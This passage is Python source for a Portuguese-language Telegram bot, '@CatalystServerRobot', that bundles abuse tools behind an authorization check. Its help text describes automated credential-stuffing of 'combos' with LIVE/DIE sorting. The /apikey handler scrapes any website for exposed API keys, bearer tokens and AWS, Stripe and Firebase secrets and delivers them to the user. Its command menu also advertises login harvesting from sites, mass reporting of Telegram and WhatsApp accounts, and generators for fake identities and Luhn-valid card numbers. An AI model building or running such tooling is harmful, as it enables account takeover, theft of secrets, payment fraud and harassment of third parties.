            "1. **Usuário clica em 'ConsultCenter'**\n"
            "2. **Escolhe 'Site Externo'**\n"
            "3. **Cola a URL: `https://seu-site.com/checker`**\n"
            "4. **Cola os combos:**\n"
            "   ```\n"
            "   user1:pass1\n"
            "   user2:pass2\n"
            "   user3:pass3\n"
            "   ```\n"
            "5. **Bot faz tudo sozinho:**\n"
            "   • Acessa o site\n"
            "   • Encontra o formulário\n"
            "   • Envia os combos\n"
            "   • Extrai os resultados\n"
            "   • Separa LIVE/DIE\n"
            "   • Retorna organizado\n\n"
            "✨ **Resultado:** Checagem automática sem trabalho manual!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"test_consultcenter_menu:{id_user_btn}")]]
        )

    elif acao == "test_consultcenter_menu":
        # Voltar ao menu de teste
        await safe_edit_message(event,
            f"🧪 **TESTE DE INTEGRAÇÃO CONSULTCENTER**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **Este comando testa:**\n"
            "• Integração com sites externos\n"
            "• Análise automática de formulários\n"
            "• Extração de resultados\n"
            "• Separação de LIVE/DIE\n\n"
            "💡 **Como usar:**\n"
            "1. Clique em 'Testar Integração'\n"
            "2. Cole a URL do site de checker\n"
            "3. Cole alguns combos de teste\n"
            "4. Veja a mágica acontecer! ✨\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🧪 Testar Integração", data=f"test_external_integration:{id_user_btn}")],
                [Button.inline("📋 Ver Exemplo", data=f"show_integration_example:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "comandos_voltar":
        # Reexibir o menu de comandos
        await safe_edit_message(event,
            "📋 **Voltando ao menu de comandos...**",
            buttons=[]
        )
        # Simular o comando /comandos novamente
        await comandos_handler(event)

    elif acao == "confirm_broadcast":
        # Confirmar e executar broadcast geral
        if f'broadcast_message_{id_user_btn}' in globals() and f'broadcast_users_{id_user_btn}' in globals():
            mensagem = globals()[f'broadcast_message_{id_user_btn}']
            usuarios_lista = globals()[f'broadcast_users_{id_user_btn}']
            
            await safe_edit_message(event,
                "📢 **Broadcast confirmado! Iniciando envio...**",
                buttons=[]
            )
            
            # Executar broadcast em background
            asyncio.create_task(executar_broadcast(id_user_btn, usuarios_lista, mensagem, "geral"))
            
            # Limpar dados temporários
            del globals()[f'broadcast_message_{id_user_btn}']
            del globals()[f'broadcast_users_{id_user_btn}']
        else:
            await event.answer("❌ Dados do broadcast não encontrados!", alert=True)

    elif acao == "confirm_broadcast_auth":
        # Confirmar e executar broadcast para autorizados
        if f'broadcast_message_{id_user_btn}' in globals() and f'broadcast_users_auth_{id_user_btn}' in globals():
            mensagem = globals()[f'broadcast_message_{id_user_btn}']
            usuarios_lista = globals()[f'broadcast_users_auth_{id_user_btn}']
            
            await safe_edit_message(event,
                "📢 **Broadcast para autorizados confirmado! Iniciando envio...**",
                buttons=[]
            )
            
            # Executar broadcast em background
            asyncio.create_task(executar_broadcast(id_user_btn, usuarios_lista, mensagem, "autorizados"))
            
            # Limpar dados temporários
            del globals()[f'broadcast_message_{id_user_btn}']
            del globals()[f'broadcast_users_auth_{id_user_btn}']
        else:
            await event.answer("❌ Dados do broadcast não encontrados!", alert=True)

    elif acao == "cancel_broadcast":
        # Cancelar broadcast
        if f'broadcast_message_{id_user_btn}' in globals():
            del globals()[f'broadcast_message_{id_user_btn}']
        if f'broadcast_users_{id_user_btn}' in globals():
            del globals()[f'broadcast_users_{id_user_btn}']
        if f'broadcast_users_auth_{id_user_btn}' in globals():
            del globals()[f'broadcast_users_auth_{id_user_btn}']
            
        await safe_edit_message(event,
            "❌ **Broadcast cancelado pelo usuário.**",
            buttons=[]
        )

    elif acao == "ping_again":
        # Recalcular ping
        start_time = time.time()
        response_time = round((time.time() - start_time) * 1000, 2)

        # Calcular uptime
        uptime_seconds = time.time() - bot_start_time if 'bot_start_time' in globals() else 0
        uptime_hours = int(uptime_seconds // 3600)
        uptime_minutes = int((uptime_seconds % 3600) // 60)
        uptime_secs = int(uptime_seconds % 60)

        # Contar usuários
        cursor.execute("SELECT COUNT(*) FROM usuarios")
        total_users = cursor.fetchone()[0]

        await safe_edit_message(event,
            f"🏓 **PONG! BOT ONLINE**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ **STATUS:** `🟢 ONLINE`\n"
            f"🕐 **Tempo de resposta:** `{response_time}ms`\n"
            f"⏰ **Uptime:** `{uptime_hours:02d}:{uptime_minutes:02d}:{uptime_secs:02d}`\n"
            f"👥 **Usuários registrados:** `{total_users}`\n"
            f"🗄️ **Banco de dados:** `✅ Conectado`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 **Informações do sistema:**\n"
            f"🐍 **Python:** `{platform.python_version()}`\n"
            f"🤖 **Telethon:** `{telethon.__version__}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🔄 Ping novamente", data=f"ping_again:{id_user_btn}"),
                 Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "use_command":
        # Extrair o comando sugerido
        comando_sugerido = parts[1]

        await event.answer(f"✅ Usando comando: {comando_sugerido}", alert=True)

        # Simular o uso do comando enviando uma mensagem
        await safe_edit_message(event,
            f"✅ **COMANDO CORRIGIDO**\n\n"
            f"🎯 **Comando selecionado:** `{comando_sugerido}`\n\n"
            f"💡 **Para usar, digite:** `{comando_sugerido}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    elif acao == "show_commands":
        await safe_edit_message(event,
            "📋 **ÁREAS DE COMANDOS DISPONÍVEIS**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **Escolha uma área para ver os comandos:**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🔍 Busca & Extração", data=f"area_busca:{id_user_btn}"),
                 Button.inline("📤 Reports", data=f"area_reports:{id_user_btn}")],
                [Button.inline("🛠️ Ferramentas", data=f"area_ferramentas:{id_user_btn}"),
                 Button.inline("⚙️ Sistema", data=f"area_sistema:{id_user_btn}")],
                [Button.inline("📋 Lista Completa", data=f"lista_completa:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )
@bot.on(events.CallbackQuery(pattern=r'^deletefile:(\d+)$'))
async def delete_file_handler(event):
    id_user_btn = int(event.pattern_match.group(1))
    if event.sender_id != id_user_btn:
        await event.answer("APENAS O USUÁRIO QUE RECEBEU O ARQUIVO PODE APAGAR.", alert=True)
        return
    await event.delete()

@bot.on(events.NewMessage(pattern=r'^/ping$'))
async def ping_handler(event):
    """Comando para verificar se o bot está online e mostrar informações básicas"""
    try:
        # Verificar autorização
        if not eh_autorizado(event.sender_id):
            await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
            return

        start_time = time.time()
        user_id = event.sender_id

        # Calcular tempo de resposta
        response_time = round((time.time() - start_time) * 1000, 2)

        # Calcular uptime do bot
        uptime_seconds = time.time() - bot_start_time if 'bot_start_time' in globals() else 0
        uptime_hours = int(uptime_seconds // 3600)
        uptime_minutes = int((uptime_seconds % 3600) // 60)
        uptime_secs = int(uptime_seconds % 60)

        # Contar usuários no banco
        cursor.execute("SELECT COUNT(*) FROM usuarios")
        total_users = cursor.fetchone()[0]

        ping_message = f"""🏓 **PONG! BOT ONLINE**

━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **STATUS:** `🟢 ONLINE`
🕐 **Tempo de resposta:** `{response_time}ms`
⏰ **Uptime:** `{uptime_hours:02d}:{uptime_minutes:02d}:{uptime_secs:02d}`
👥 **Usuários registrados:** `{total_users}`
🗄️ **Banco de dados:** `✅ Conectado`

━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **Informações do sistema:**
🐍 **Python:** `{platform.python_version()}`
🤖 **Telethon:** `{telethon.__version__}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 @CatalystServerRobot"""

        await event.reply(
            ping_message,
            buttons=[[Button.inline("🔄 Ping novamente", data=f"ping_again:{user_id}"),
                     Button.inline("🗑️ Apagar", data=f"apagarmensagem:{user_id}")]]
        )

    except Exception as e:
        await event.reply(
            f"❌ **ERRO NO COMANDO PING**\n\n"
            f"⚠️ Erro: `{str(e)}`\n\n"
            "🤖 @CatalystServerRobot"
        )

# Comando /apikey (renomeado de /findkeys)  
@bot.on(events.NewMessage(pattern=r'^/apikey (.+)'))
async def find_api_keys_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    url = event.pattern_match.group(1).strip()
    user_id = event.sender_id

    # Validar URL
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    processing_msg = await event.reply(
        f"🔑 **BUSCANDO API KEYS...**\n\n"
        f"🌐 **URL:** `{url}`\n"
        f"⏳ **STATUS:** Analisando código fonte...\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔍 **Procurando por:**\n"
        "• API Keys expostas\n"
        "• Tokens de acesso\n"
        "• Chaves secretas\n"
        "• Credenciais em JavaScript\n"
        "• Headers de autenticação\n\n"
        "⏳ **Aguarde, isso pode levar alguns minutos...**"
    )

    try:
        import requests
        from bs4 import BeautifulSoup
        import re

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        response = requests.get(url, headers=headers, timeout=15)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Padrões para encontrar API keys
        api_key_patterns = [
            # API Keys gerais
            (r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{10,})["\']', "API Key"),
            (r'["\']?apikey["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{10,})["\']', "API Key"),
            (r'["\']?access[_-]?token["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_\.]{10,})["\']', "Access Token"),
            (r'["\']?secret[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{10,})["\']', "Secret Key"),
            (r'["\']?private[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{10,})["\']', "Private Key"),
            
            # Tokens específicos
            (r'Bearer\s+([A-Za-z0-9\-\._~\+\/]+)', "Bearer Token"),
            (r'["\']?token["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_\.]{15,})["\']', "Token"),
            
            # Serviços específicos
            (r'["\']?google[_-]?api[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{30,})["\']', "Google API Key"),
            (r'["\']?stripe[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{30,})["\']', "Stripe Key"),
            (r'["\']?aws[_-]?access[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9]{16,})["\']', "AWS Access Key"),
            (r'["\']?firebase[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{30,})["\']', "Firebase Key"),
            
            # Outros padrões
            (r'Authorization\s*:\s*["\']([^"\']+)["\']', "Authorization Header"),
            (r'X-API-Key\s*:\s*["\']([^"\']+)["\']', "X-API-Key Header"),
        ]

        found_keys = []
        all_text = response.text

        # Buscar nos scripts JavaScript
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                all_text += script.string

        # Buscar patterns
        for pattern, key_type in api_key_patterns:
            matches = re.findall(pattern, all_text, re.IGNORECASE)
            for match in matches:
                if len(match) > 8 and match not in ['example', 'test', 'demo', 'placeholder']:
                    found_keys.append({
                        'type': key_type,
                        'value': match,
                        'length': len(match)
                    })

        # Remover duplicatas
        unique_keys = []
        seen = set()
        for key in found_keys:
            if key['value'] not in seen:
                unique_keys.append(key)
                seen.add(key['value'])

        if unique_keys:
            message = f"🔑 **API KEYS ENCONTRADAS - {url}**\n\n"
            message += f"📊 **Total encontrado:** `{len(unique_keys)} keys`\n\n"
            message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

            for i, key in enumerate(unique_keys[:10], 1):  # Mostrar apenas as primeiras 10
                message += f"**{i}. {key['type']}**\n"
                message += f"🔑 `{key['value'][:50]}{'...' if len(key['value']) > 50 else ''}`\n"
                message += f"📏 Tamanho: {key['length']} caracteres\n\n"

            if len(unique_keys) > 10:
                message += f"• ... e mais {len(unique_keys) - 10} keys encontradas\n\n"

            message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            message += "⚠️ **IMPORTANTE:**\n"
            message += "• Verifique se as keys são válidas\n"
            message += "• Teste em ambiente controlado\n"
            message += "• Use com responsabilidade\n\n"
            message += "🤖 @CatalystServerRobot"

            # Criar arquivo com todas as keys se houver muitas
            if len(unique_keys) > 5:
                filename = f"temp/api_keys_{user_id}.txt"
                os.makedirs("temp", exist_ok=True)
                
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"=== API KEYS ENCONTRADAS ===\n")
                    f.write(f"Site: {url}\n")
                    f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
                    f.write(f"Total: {len(unique_keys)} keys\n\n")
                    
                    for i, key in enumerate(unique_keys, 1):
                        f.write(f"{i}. {key['type']}\n")
                        f.write(f"Key: {key['value']}\n")
                        f.write(f"Tamanho: {key['length']} caracteres\n\n")

                await processing_msg.edit(message)
                await bot.send_file(
                    user_id, 
                    file=filename,
                    caption=f"🔑 **Todas as API Keys encontradas - {url}**\n\n🤖 @CatalystServerRobot",
                    buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{user_id}")]]
                )

                # Limpar arquivo temporário
                try:
                    os.remove(filename)
                except:
                    pass
            else:
                await processing_msg.edit(message, 
                    buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{user_id}")]]
                )
        else:
            await processing_msg.edit(
                f"❌ **NENHUMA API KEY ENCONTRADA**\n\n"
                f"🌐 **URL:** `{url}`\n\n"
                "🔍 **Verificações realizadas:**\n"
                "• Código fonte da página\n"
                "• Scripts JavaScript\n"
                "• Headers de resposta\n"
                "• Padrões comuns de keys\n\n"
                "💡 **Dicas:**\n"
                "• Tente URLs mais específicas (ex: /js/app.js)\n"
                "• Verifique se o site usa autenticação\n"
                "• Analise o código fonte manualmente\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{user_id}")]]
            )

    except Exception as e:
        await processing_msg.edit(
            f"❌ **ERRO AO BUSCAR API KEYS**\n\n"
            f"⚠️ Erro: `{str(e)[:200]}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 Tente novamente ou verifique a URL.\n\n"
            "🤖 @CatalystServerRobot"
        )

# Comando /api (renomeado de /apianalyzer)
@bot.on(events.NewMessage(pattern=r'^/api (.+)'))
async def api_analyzer_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    url = event.pattern_match.group(1).strip()
    user_id = event.sender_id

    # Validar URL
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    if not API_ANALYZER_AVAILABLE:
        await event.reply(
            f"❌ **API ANALYZER INDISPONÍVEL**\n\n"
            "⚠️ O módulo de análise de APIs não está disponível no momento.\n\n"
            "💡 Use `/webscraper {url}` como alternativa para extrair dados básicos.\n\n"
            "🤖 @CatalystServerRobot"
        )
        return

    processing_msg = await event.reply(
        f"🔍 **INICIANDO ANÁLISE COMPLETA DE APIs...**\n\n"
        f"🌐 **URL:** `{url}`\n"
        f"⏳ **STATUS:** Analisando APIs...\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 **Análises em andamento:**\n"
        "• Endpoints JavaScript\n"
        "• Formulários e campos\n"
        "• Documentação de APIs\n"
        "• Swagger/OpenAPI\n"
        "• GraphQL endpoints\n"
        "• WebSocket endpoints\n"
        "• Métodos de autenticação\n"
        "• Análise de CORS\n"
        "• Vulnerabilidades comuns\n\n"
        "⏳ **Aguarde, isso pode levar alguns minutos...**"
    )

    try:
        # Executar análise completa
        results = await asyncio.to_thread(analyze_website_apis_comprehensive, url)

        if "error" in results:
            await processing_msg.edit(
                f"❌ **ERRO NA ANÁLISE DE APIs**\n\n"
                f"🌐 URL: `{url}`\n"
                f"⚠️ Erro: `{results['error']}`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "💡 Verifique se a URL está correta e acessível.\n\n"
                "🤖 @CatalystServerRobot"
            )
            return

        # Formatar resultados resumidos
        message = f"🔍 **ANÁLISE COMPLETA DE APIs - RESULTADO**\n\n"
        message += f"🌐 **URL:** `{results['target_url']}`\n"
        message += f"📅 **Data:** `{results['analysis_timestamp']}`\n"
        message += f"🎯 **Total de endpoints:** `{results.get('total_endpoints_found', 0)}`\n\n"
        message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        # Resumo por categoria
        categories = [
            ("📝 Formulários", "forms"),
            ("🔧 APIs JavaScript", "javascript_apis"),
            ("🌐 Endpoints", "endpoints"),
            ("📚 Documentação", "api_documentation"),
            ("📋 Swagger/OpenAPI", "swagger_openapi"),
            ("⚡ GraphQL", "graphql_endpoints"),
            ("🔌 WebSockets", "websocket_endpoints"),
            ("🔐 Autenticação", "authentication_methods"),
            ("🛡️ Vulnerabilidades", "common_vulnerabilities")
        ]

        for name, key in categories:
            data = results.get(key, [])
            if data:
                message += f"{name}: `{len(data)}`\n"

        if results.get('cors_analysis', {}).get('cors_enabled'):
            message += f"🌍 CORS: `Habilitado`\n"

        message += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        message += f"📄 **Relatório completo será enviado como arquivo**\n\n"
        message += "🤖 @CatalystServerRobot"

        # Criar arquivo com resultados completos
        filename = f"temp/api_analysis_{user_id}.json"
        os.makedirs("temp", exist_ok=True)
        
        with open(filename, "w", encoding="utf-8") as f:
            import json
            json.dump(results, f, indent=2, ensure_ascii=False)

        await processing_msg.edit(message)
        await bot.send_file(
            user_id, 
            file=filename,
            caption=f"📄 **Análise Completa de APIs - {results['target_url']}**\n\n🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{user_id}")]]
        )

        # Limpar arquivo temporário
        try:
            os.remove(filename)
        except:
            pass

    except Exception as e:
        await processing_msg.edit(
            f"❌ **ERRO DURANTE ANÁLISE**\n\n"
            f"⚠️ Erro: `{str(e)[:200]}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 Tente novamente ou verifique a URL.\n\n"
            "🤖 @CatalystServerRobot"
        )

@bot.on(events.NewMessage(pattern=r'^/geradores$'))
async def geradores_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    user_id = event.sender_id

    await event.reply(
        f"🎲 **CATALYST GERADORES v4.0**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🛠️ **FERRAMENTAS DE GERAÇÃO:**\n\n"
        "👤 **GERADOR DE PESSOA FAKE v2.0**\n"
        "💳 **GERADOR DE CARTÕES DE CRÉDITO**\n"
        "🏢 **GERADOR DE EMPRESAS FAKE**\n"
        "✅ **VALIDADORES CPF/CNPJ**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 **RECURSOS AVANÇADOS:**\n"
        "• Algoritmos de validação oficiais\n"
        "• Cartões válidos por algoritmo Luhn\n"
        "• Empresas com dados realistas\n"
        "• Validação em tempo real\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot",
        buttons=[
            [Button.inline("👤 Pessoa Fake v2.0", data=f"fake_person:{user_id}"),
             Button.inline("💳 Cartões de Crédito", data=f"cartoes_credito:{user_id}")],
            [Button.inline("🏢 Empresas Fake", data=f"empresas_fake:{user_id}"),
             Button.inline("✅ Validadores", data=f"validadores:{user_id}")],
            [Button.inline("🗑️ Cancelar", data=f"apagarmensagem:{user_id}")]
        ]
    )

@bot.on(events.NewMessage(pattern=r'^/restartbot$'))
async def restart_bot_handler(event):
    """Comando para reiniciar o bot - apenas para administradores"""
    user_id = event.sender_id

    if not eh_dono(user_id):
        await event.reply("🚫 **ACESSO NEGADO** - Apenas administradores podem usar este comando.")
        return

    await event.reply(
        "🔄 **REINICIANDO BOT...**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚡ **Reinicializando sistema...**\n"
        "🗂️ **Limpando dados temporários...**\n"
        "💾 **Salvando configurações...**\n\n"
        "⏳ **Aguarde alguns segundos...**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot"
    )

    try:
        # Limpar dados temporários e resetar variáveis globais
        global report_data, whatsapp_report_data, usuarios_bloqueados, usuarios_autorizados
        global mensagens_origem, urls_busca, tasks_canceladas, divulgacao_ativa

        print("🔄 Comando /restartbot executado pelo administrador")
        print("🗂️ Limpando dados temporários...")

        # Parar todos os reports em andamento
        report_data["running"] = False
        whatsapp_report_data["running"] = False

        # Cancelar todas as tarefas de busca
        for hash_nome in tasks_canceladas:
            tasks_canceladas[hash_nome]['cancelled'] = True

        # Limpar todos os diretórios temporários
        import shutil
        if os.path.exists("temp"):
            try:
                shutil.rmtree("temp")
                os.makedirs("temp", exist_ok=True)
                print("✅ Diretório temp limpo")
            except Exception as e:
                print(f"⚠️ Erro ao limpar temp: {e}")

        # Resetar variáveis globais
        usuarios_bloqueados.clear()
        usuarios_autorizados.clear()
        mensagens_origem.clear()
        urls_busca.clear()
        tasks_canceladas.clear()

        # Parar divulgação se estiver ativa
        divulgacao_ativa = False

        # Resetar dados de report
        report_data = {
            "text": "",
            "link": "",
            "quantity": 0,
            "running": False,
            "counter": 0,
            "start_time": None,
            "user_id": None
        }

        whatsapp_report_data = {
            "phone": "",
            "quantity": 0,
            "running": False,
            "counter": 0,
            "start_time": None,
            "user_id": None
        }

        # Limpar estados de report2 e validadores
        globals_to_remove = []
        for key in globals():
            if key.startswith(('report2_data_', 'validar_cpf_state_', 'validar_cnpj_state_', 
                             'validar_cartao_state_', 'sites_state_')):
                globals_to_remove.append(key)

        for key in globals_to_remove:
            try:
                del globals()[key]
            except:
                pass

        print("✅ Dados temporários limpos")
        print("✅ Variáveis globais resetadas")

        # Aguardar um pouco antes de enviar confirmação
        await asyncio.sleep(2)

        await bot.send_message(
            user_id,
            "✅ **BOT REINICIADO COM SUCESSO!**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **Ações realizadas:**\n"
            "• 🗂️ Dados temporários limpos\n"
            "• 🔄 Variáveis resetadas\n"
            "• ⏹️ Reports interrompidos\n"
            "• 🛑 Buscas canceladas\n"
            "• 💾 Sistema otimizado\n\n"
            "🚀 **Bot mais leve e pronto para uso!**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot"
        )

        print("✅ Bot reiniciado com sucesso pelo administrador")

    except Exception as e:
        print(f"❌ Erro durante reinicialização: {e}")
        try:
            await bot.send_message(
                user_id,
                f"❌ **ERRO DURANTE REINICIALIZAÇÃO**\n\n"
                f"⚠️ Erro: `{str(e)[:100]}`\n\n"
                "💡 O bot ainda está funcionando normalmente.\n\n"
                "🤖 @CatalystServerRobot"
            )
        except:
            pass

@bot.on(events.NewMessage(pattern=r'^/comandos$'))
async def comandos_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    user_id = event.sender_id

    # Comandos básicos para todos os membros
    comandos_membros = (
        f"👥 **COMANDOS PARA MEMBROS**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔧 **SISTEMA BÁSICO:**\n"
        "• `/start` - Iniciar o bot\n"
        "• `/ping` - Verificar status do bot\n"
        "• `/reset` - Resetar todos os dados\n"
        "• `/comandos` - Ver esta lista\n\n"
        "🔍 **BUSCA & EXTRAÇÃO:**\n"
        "• `/search [url]` - Buscar logins em sites\n"
        "• `/webscraper [url]` - Extrair dados do site\n"
        "• `/api [url]` - Análise completa de APIs\n"
        "• `/apikey [url]` - Buscar API Keys expostas\n\n"
        "📤 **SISTEMA DE REPORTS:**\n"
        "• `/report` - Reports Telegram (básico)\n"
        "• `/report2` - Sistema avançado de reports\n"
        "• `/reportwpp` - Reportar números WhatsApp\n\n"
        "🛠️ **FERRAMENTAS:**\n"
        "• `/checker` - Sites Checker e Fake Person\n"
        "• `/geradores` - Gerador de pessoas, cartões, empresas\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )

    # Comandos do administrador
    comandos_admin = ""
    if eh_dono(user_id):
        comandos_admin = (
            "👑 **COMANDOS DE ADMINISTRADOR**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔐 **GERENCIAMENTO DE USUÁRIOS:**\n"
            "• `/autorizar [ID]` - Autorizar usuário permanente\n"
            "• `/autorizar [ID] [tempo][d/h/m]` - Autorizar temporário\n"
            "• `/estender [ID] [tempo][d/h/m]` - Estender tempo\n"
            "• `/desautorizar [ID]` - Remover autorização\n"
            "• `/listautorizados` - Listar usuários autorizados\n"
            "• `/authstatus` - Status do sistema de autorização\n\n"
            "💡 **Exemplos de autorização:**\n"
            "• `/autorizar 123456789` - Permanente\n"
            "• `/autorizar 123456789 30d` - 30 dias\n"
            "• `/autorizar 123456789 12h` - 12 horas\n"
            "• `/autorizar 123456789 60m` - 60 minutos\n"
            "• `/estender 123456789 7d` - Adicionar 7 dias\n\n"
            "📢 **SISTEMA DE DIVULGAÇÃO:**\n"
            "• `/on` - Ativar divulgação automática\n"
            "• `/off` - Desativar divulgação automática\n"
            "• `/addchat @canal` - Adicionar chat à divulgação\n"
            "• `/addchat -100123456789` - Adicionar por ID\n"
            "• `/removechat @canal` - Remover chat da divulgação\n"
            "• `/removechat -100123456789` - Remover por ID\n"
            "• `/listchats` - Listar chats autorizados\n"
            "• `/divconfig` - Configurações de divulgação\n"
            "• `/testdiv` - Testar sistema de divulgação\n\n"
            "📺 **SISTEMA DE BROADCAST:**\n"
            "• `/broadcast [mensagem]` - Enviar para todos os usuários\n"
            "• `/broadcastauth [mensagem]` - Enviar apenas para autorizados\n\n"
            "🔄 **CONTROLE DO SISTEMA:**\n"
            "• `/restartbot` - Reiniciar e otimizar o bot\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        )

    # Mensagem final
    mensagem_final = (
        "💡 **INSTRUÇÕES DE USO:**\n"
        "• Digite o comando desejado no chat\n"
        "• Siga as instruções do bot\n"
        "• Use `/reset` se algo der errado\n"
        "• Use os botões abaixo para acesso rápido\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 @CatalystServerRobot"
    )

    # Montar mensagem completa
    mensagem_completa = comandos_membros + comandos_admin + mensagem_final

    # Criar botões baseados no tipo de usuário
    botoes = []
    
    # Botões básicos para todos
    botoes.extend([
        [Button.inline("🔍 Search", data=f"cmd_search:{user_id}"),
         Button.inline("🌐 WebScraper", data=f"cmd_webscraper:{user_id}")],
        [Button.inline("📝 Report TG", data=f"cmd_report:{user_id}"),
         Button.inline("📱 Report WPP", data=f"cmd_reportwpp:{user_id}")],
        [Button.inline("🛠️ Checker", data=f"cmd_checker:{user_id}"),
         Button.inline("🎲 Geradores", data=f"cmd_geradores:{user_id}")],
        [Button.inline("⚡ Report2", data=f"cmd_report2:{user_id}"),
         Button.inline("🏓 Ping", data=f"cmd_ping:{user_id}")],
        [Button.inline("🔄 Reset", data=f"cmd_reset:{user_id}"),
         Button.inline("🏠 Start", data=f"cmd_start:{user_id}")]
    ])
    
    # Botões adicionais para administradores
    if eh_dono(user_id):
        botoes.extend([
            [Button.inline("🔐 Autorização", data=f"admin_auth:{user_id}"),
             Button.inline("📢 Divulgação", data=f"admin_div:{user_id}")],
            [Button.inline("📺 Broadcast", data=f"admin_broadcast:{user_id}"),
             Button.inline("📊 Status Sistema", data=f"admin_status:{user_id}")],
            [Button.inline("🔄 Restart Bot", data=f"admin_restart:{user_id}")]
        ])
    
    # Botão de fechar
    botoes.append([Button.inline("🗑️ Fechar", data=f"apagarmensagem:{user_id}")])

    await event.reply(
        mensagem_completa,
        buttons=botoes
    )

@bot.on(events.NewMessage(pattern=r'^/checker$'))
async def checker_handler(event):
    # Verificar autorização
    if not eh_autorizado(event.sender_id):
        await event.reply("🚫 **ACESSO NEGADO** - Você não tem autorização para usar este bot.")
        return

    user_id = event.sender_id

    await event.reply(
        f"🔍 **CATALYST CHECKER v3.0**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
